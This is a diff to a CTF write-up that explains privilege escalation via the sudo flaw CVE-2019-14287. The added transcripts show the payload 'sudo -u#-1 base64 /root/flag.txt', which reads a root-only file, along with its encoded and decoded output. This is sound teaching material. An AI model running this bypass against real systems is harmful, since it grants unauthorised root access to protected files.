@@ -1,4 +1,4 @@
-1. Reader
+## Reader
 
 > Salam jumaat @everyone, here jumaats challenge. It is privilege escalation based on CVE-2019-14287. Feel free to check it out :).
 > Privilege escalation is the process by which a user gains elevated access to resources that are normally protected from that user's standard capabilities. This can occur in two main forms:
@@ -38,8 +38,18 @@ User ctf-player may run the following commands on d86f88d61095:
 1. The `(ALL, !root) /bin/base64` means that user(ctf-player) in this case can run the /bin/base64 command as any user except root. Base64 command can do some encode and decode in base64.
 2. Now we can craft our payload to run as user `-u#-1` in this case Sudo treat it as 0 which is root. 
     1. Payload : `sudo -u#-1 base64 /root/flag.txt`
-    2. Explanation : This command encodes the contents of `/root/flag` using Base64 encoding as `root` privileges through sudo. 
+    2. Explanation : This command encodes the contents of `/root/flag` using Base64 encoding as `root` privileges through sudo.
+```bash
+ctf-player@d86f88d61095:~$ sudo -u#-1 base64 /root/flag.txt
+RWFzeSBodWg/IEhlcmUgdGhlIGZsYWcgOiBJQ0V7dGhAbmtmdTExeV90aDFzX0NWRV9hcmVfcEB0
+Y2gzZH0K
+```
     
     ![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/703f9dd9-36fd-453d-93d3-099f508c8cdf/cb1b164b-d24d-4164-8af9-b59920c0214a/Untitled.png)
     
 3. Now we can decode it using `base64 -d`
+
+```bash
+ctf-player@d86f88d61095:~$ sudo -u#-1 base64 /root/flag.txt | base64 -d                                
+Easy huh? Here the flag : ICE{th@nkfu11y_th1s_CVE_are_p@tch3d}
+```
